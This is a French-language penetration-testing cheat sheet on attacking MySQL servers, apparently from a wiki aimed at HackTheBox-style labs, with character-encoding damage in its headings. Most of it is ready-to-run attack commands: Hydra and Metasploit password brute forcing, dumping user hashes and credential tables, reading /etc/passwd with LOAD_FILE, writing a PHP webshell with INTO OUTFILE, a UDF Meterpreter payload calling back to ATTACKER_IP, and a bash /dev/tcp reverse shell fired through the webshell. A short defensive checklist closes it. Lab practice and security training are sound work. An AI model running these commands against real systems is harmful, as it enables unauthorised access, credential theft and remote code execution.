# üóÑÔ∏è √ânum√©ration MySQL

[‚Üê Retour √† la table des mati√®res](../README.md)

## üìã Table des Mati√®res
- [Informations g√©n√©rales](#informations-g√©n√©rales)
- [√ânum√©ration avec Nmap](#√©num√©ration-avec-nmap)
- [Metasploit Modules](#metasploit-modules)
- [Bruteforce](#bruteforce-mysql)
- [Connexion manuelle](#connexion-manuelle)
- [Commandes MySQL utiles](#commandes-mysql-utiles)
- [Extraction de donn√©es](#extraction-de-donn√©es)
- [Exploitation](#exploitation)

---

## Informations g√©n√©rales

**Port par d√©faut :** 3306  
**Service :** MySQL / MariaDB

‚ö†Ô∏è **Note importante :** Impacket ne contient **pas** d'outil MySQL natif.  
Pour MySQL, utilisez les outils standards (mysql-client) ou Metasploit.

üîó **Pour MSSQL (Microsoft SQL Server)**, voir : [Impacket - mssqlclient.py](../06-tools/impacket.md#mssqlclientpy---microsoft-sql-server-)

---

## √ânum√©ration avec Nmap

```bash
# D√©tection de version MySQL
nmap -sV -p 3306 TARGET_IP

# Scripts NSE MySQL
nmap --script mysql-info -p 3306 TARGET_IP
nmap --script mysql-enum -p 3306 TARGET_IP
nmap --script mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 TARGET_IP
nmap --script mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 TARGET_IP
nmap --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password=''" -p 3306 TARGET_IP
```

---

## Metasploit Modules

### √ânum√©ration de version
```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS TARGET_IP
run
```

### Bruteforce de credentials
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
run
```

### √ânum√©ration de la base
```bash
use auxiliary/admin/mysql/mysql_enum
set RHOSTS TARGET_IP
set USERNAME root
set PASSWORD ''
run
```

### Ex√©cution de requ√™tes SQL
```bash
use auxiliary/admin/mysql/mysql_sql
set RHOSTS TARGET_IP
set USERNAME root
set PASSWORD ''
set SQL SELECT user, host, password FROM mysql.user;
run
```

### Autres modules utiles
```bash
use auxiliary/scanner/mysql/mysql_file_enum      # √ânum√©rer les fichiers lisibles
use auxiliary/scanner/mysql/mysql_hashdump        # Dumper les hashes des utilisateurs
use auxiliary/scanner/mysql/mysql_schemadump      # Dumper le sch√©ma de la base
use auxiliary/scanner/mysql/mysql_writable_dirs   # Trouver les dossiers accessibles en √©criture
```

---

## Bruteforce MySQL

### Avec Hydra ‚Üí [üìñ Guide complet Hydra](../06-tools/hydra.md)
```bash
# Bruteforce basique
hydra -L users.txt -P passwords.txt TARGET_IP mysql

# Avec wordlist commune
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt TARGET_IP mysql

# Utilisateur sp√©cifique
hydra -l root -P /usr/share/wordlists/rockyou.txt TARGET_IP mysql

# Options recommand√©es
hydra -L users.txt -P passwords.txt TARGET_IP mysql -t 4 -V
```

### Avec Metasploit (voir ci-dessus)
```bash
use auxiliary/scanner/mysql/mysql_login
```

---

## Connexion manuelle

### Client MySQL standard
```bash
# Installation du client (si n√©cessaire)
apt install mysql-client -y

# Connexion avec mot de passe
mysql -h TARGET_IP -u root -p

# Connexion sans mot de passe (utilisateurs mal configur√©s)
mysql -h TARGET_IP -u root
mysql -h TARGET_IP -u root --skip-ssl

# Port personnalis√©
mysql -h TARGET_IP -P 3307 -u root -p

# Connexion avec base de donn√©es sp√©cifique
mysql -h TARGET_IP -u root -p database_name
```

---

## Commandes MySQL utiles

### √ânum√©ration basique
```sql
-- Version du serveur
SELECT @@version;
SELECT VERSION();

-- Utilisateur actuel
SELECT USER();
SELECT CURRENT_USER();

-- Base de donn√©es actuelle
SELECT DATABASE();

-- Lister les bases de donn√©es
SHOW DATABASES;

-- Lister les utilisateurs
SELECT user, host, authentication_string FROM mysql.user;

-- Privil√®ges de l'utilisateur actuel
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();
```

### √ânum√©ration des tables
```sql
-- Utiliser une base de donn√©es
USE database_name;

-- Lister les tables
SHOW TABLES;

-- D√©crire une table
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;

-- Lister toutes les tables de toutes les bases
SELECT table_schema, table_name 
FROM information_schema.tables 
WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys');
```

---

## Extraction de donn√©es

### Lire des credentials
```sql
-- Chercher des tables contenant des users/passwords
SELECT table_name 
FROM information_schema.columns 
WHERE column_name LIKE '%password%' OR column_name LIKE '%user%';

-- Exemples courants
SELECT * FROM users;
SELECT username, password FROM accounts;
SELECT * FROM wp_users;  -- WordPress
```

### Lire des fichiers (si permissions FILE)
```sql
-- V√©rifier la permission FILE
SHOW GRANTS;

-- Lire un fichier
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Sauvegarder le r√©sultat dans un fichier (si permissions)
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
```

---

## Exploitation

### √âcriture de fichiers (Webshell)
```sql
-- V√©rifier o√π √©crire (trouver le webroot)
SHOW VARIABLES LIKE 'datadir';
SHOW VARIABLES LIKE 'secure_file_priv';

-- √âcrire un webshell PHP (si permissions)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Webshell plus avanc√©
SELECT '<?php system($_GET["cmd"]); echo "<!-- Shell by MySQL -->" ?>' 
INTO OUTFILE '/var/www/html/s.php';
```

**üîó Voir aussi :** [Reverse Shells PHP](../08-payloads/reverse-shells.md#php)

### Ex√©cution de commandes syst√®me (UDF)

‚ö†Ô∏è **User-Defined Functions (UDF)** permettent l'ex√©cution de code.

```bash
# Via Metasploit
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS TARGET_IP
set USERNAME root
set PASSWORD ''
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run
```

**üí° Pr√©requis :**
- Acc√®s root MySQL
- Plugin directory accessible en √©criture
- Version MySQL vuln√©rable

---

## üîó Workflow d'attaque MySQL

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  1. D√âCOUVERTE                              ‚îÇ
‚îÇ  nmap -sV -p 3306 TARGET_IP                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  2. BRUTEFORCE                              ‚îÇ
‚îÇ  hydra / metasploit mysql_login             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  3. CONNEXION                               ‚îÇ
‚îÇ  mysql -h IP -u root -p                     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  4. √âNUM√âRATION                             ‚îÇ
‚îÇ  SHOW DATABASES; SELECT * FROM users;       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  5. EXPLOITATION                            ‚îÇ
‚îÇ  - Lire /etc/passwd (LOAD_FILE)             ‚îÇ
‚îÇ  - √âcrire webshell (INTO OUTFILE)           ‚îÇ
‚îÇ  - Ex√©cuter code (UDF)                      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## üéØ Exemples pratiques

### Sc√©nario 1 : Acc√®s root sans mot de passe
```bash
# Connexion
mysql -h 10.129.95.232 -u root

# Une fois connect√©
mysql> SHOW DATABASES;
mysql> USE webapp;
mysql> SHOW TABLES;
mysql> SELECT * FROM users;
mysql> SELECT username, password FROM accounts WHERE role='admin';
```

### Sc√©nario 2 : Webshell via MySQL
```bash
# Connexion
mysql -h 10.129.95.232 -u root -p

# V√©rifier les permissions
mysql> SHOW GRANTS;

# Trouver le webroot
mysql> SHOW VARIABLES LIKE 'datadir';

# √âcrire un webshell
mysql> SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/x.php';

# Tester via navigateur
curl http://10.129.95.232/x.php?c=id
curl http://10.129.95.232/x.php?c=whoami

# Reverse shell
# Sur Kali
nc -nvlp 4444

# Via MySQL webshell
curl http://10.129.95.232/x.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27
```

---

## üîó Liens connexes

### Outils
- [Hydra](../06-tools/hydra.md) - Bruteforce MySQL
- [Impacket - MSSQL](../06-tools/impacket.md#mssqlclientpy---microsoft-sql-server-) - Pour Microsoft SQL Server
- [SQLMap](https://sqlmap.org/) - Exploitation SQL Injection

### Exploitation
- [Reverse Shells](../08-payloads/reverse-shells.md) - Shells √† ex√©cuter
- [SQL Injection](../04-exploitation/sql-injection.md) - Exploitation web ‚Üí MySQL

### Post-exploitation
- [Linux PrivEsc](../05-post-exploitation/linux-privesc.md) - Apr√®s webshell

---

## üí° Conseils de s√©curit√©

### D√©tection
```bash
# V√©rifier les connexions actives
netstat -tnlp | grep 3306

# Logs MySQL
tail -f /var/log/mysql/mysql.log
```

### Bonnes pratiques d√©fensives
- ‚úÖ Toujours d√©finir un mot de passe root fort
- ‚úÖ Restreindre MySQL √† `localhost` (bind-address = 127.0.0.1)
- ‚úÖ D√©sactiver `LOAD_FILE()` et `INTO OUTFILE` si non n√©cessaire
- ‚úÖ Supprimer les utilisateurs anonymes
- ‚úÖ Limiter les privil√®ges FILE, SUPER, PROCESS

---

**üéì Prochaines √©tapes :**
- Pratiquer sur **HackTheBox** : Machines avec MySQL (ex: Sequel)
- √âtudier **SQL Injection** pour exploitation web ‚Üí MySQL
- Comparer avec **MSSQL** (voir Impacket)
